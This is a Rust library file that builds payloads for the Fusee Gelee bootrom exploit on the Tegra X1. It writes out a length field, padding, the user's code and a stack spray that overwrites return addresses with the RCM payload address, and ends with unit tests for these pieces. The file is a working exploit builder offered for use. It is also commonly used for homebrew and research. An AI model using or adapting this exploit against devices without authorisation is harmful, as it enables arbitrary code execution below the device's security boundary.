//! `Fusee` builds a payload which can be used to exploit a vulnerable
//! Tegra X1 using the [Fusee Gelee exploit](https;//github.com/Qyriad/fusee-launcher].
//!
//! A payload has the following structure:
//! 1. RCM command that includes the maximum length, ensuring that we can
//! send as much as possible.
//! 2. The stack spray  to override the return address.
//! 3. The program which should be executed.
//! 4. The payload is padded to be evenly divisible by the 0x1000 block size.

pub use bytes;
use bytes::{BufMut, Bytes, BytesMut};
pub use rusb;

pub mod usb;

#[cfg(target_os = "linux")]
#[macro_use]
extern crate nix;

const LENGTH: u32 = 0x30298;

// The address where the RCM payload is placed.
// This is fixed for most device.
const RCM_PAYLOAD_ADDR: u32 = 0x4001_0000;

// The address where the user payload is expected to begin.
const PAYLOAD_START_ADDR: u32 = 0x4001_0E40;

// Specify the range of addresses where we should inject the
// payload address.
const STACK_SPRAY_START: u32 = 0x4001_4E40;
const STACK_SPRAY_END: u32 = 0x4001_7000;

/// Builds the payload that executes the given code using the Fusee
/// Gelee exploit.
pub fn build_payload(code: Bytes) -> Bytes {
    let mut payload = BytesMut::new();

    insert_length(&mut payload);
    let len = payload.len();
    insert_padding(&mut payload, PAYLOAD_START_ADDR as usize - len);
    insert_code(&mut payload, code);
    let len = payload.len();
    insert_padding(&mut payload, 0x1000 - (len % 0x1000));

    payload.freeze()
}

fn insert_padding(payload: &mut BytesMut, len: usize) {
    let padding = b"\0".repeat(len);
    payload.put_slice(padding.as_slice());
}

fn insert_length(payload: &mut BytesMut) {
    payload.put_u32_le(LENGTH);
}

fn insert_code(payload: &mut BytesMut, code: Bytes) {
    let len = (STACK_SPRAY_START - PAYLOAD_START_ADDR) as usize;
    if code.len() < len {
        payload.put(code);
    } else {
        let mut first_part = code;
        let second_part = first_part.split_off(len);
        payload.put(first_part);
        insert_stack_spray(payload);
        payload.put(second_part);
    }
}

fn insert_stack_spray(payload: &mut BytesMut) {
    let count = ((STACK_SPRAY_END - STACK_SPRAY_START) / 4) as u32;
    for _ in 0..count {
        payload.put_u32_le(RCM_PAYLOAD_ADDR);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_insert_length() {
        let mut payload = BytesMut::new();
        insert_length(&mut payload);
        assert_eq!(&payload[..], &[0x98, 0x02, 0x03, 0x00]);
    }

    #[test]
    fn test_insert_padding() {
        let mut payload = BytesMut::new();
        insert_padding(&mut payload, 10);
        assert_eq!(&payload[..], &[0x0; 10]);
    }

    #[test]
    fn test_insert_stack_spray() {
        let mut payload = BytesMut::new();
        let count = ((STACK_SPRAY_END - STACK_SPRAY_START) / 4) as usize;
        insert_stack_spray(&mut payload);
        assert_eq!(
            &payload[..],
            RCM_PAYLOAD_ADDR.to_le_bytes().repeat(count).as_slice()
        );
    }

    #[test]
    fn test_insert_code() {
        let mut payload = BytesMut::new();
        insert_code(&mut payload, Bytes::default());
        assert_eq!(&payload[..], &[0x0; 0]);

        let mut code = BytesMut::new();
        code.put_u32_le(0x40010000);
        insert_code(&mut payload, code.freeze());
        assert_eq!(&payload[..], &[0x0, 0x0, 0x1, 0x40]);
    }
}
